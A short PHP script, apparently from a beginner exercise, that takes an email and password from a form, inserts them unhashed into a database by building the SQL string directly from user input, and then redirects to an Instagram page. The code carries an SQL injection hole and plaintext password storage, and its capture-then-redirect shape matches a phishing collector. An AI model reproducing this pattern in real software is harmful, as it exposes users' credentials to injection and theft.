<?php
    include_once("connection.php");

    $emailFront = $_POST['emailInp'];
    $senhaFront = $_POST['senhaInp'];
    
    $sql = "INSERT INTO user (email,senha) VALUES ('$emailFront','$senhaFront')";

    if(mysqli_query($con,$sql)){
        header('Location: https://www.instagram.com/digitalinnovation.one/');
    }else{
        echo mysqli_connect_error();
    }

    mysqli_close($con);
?>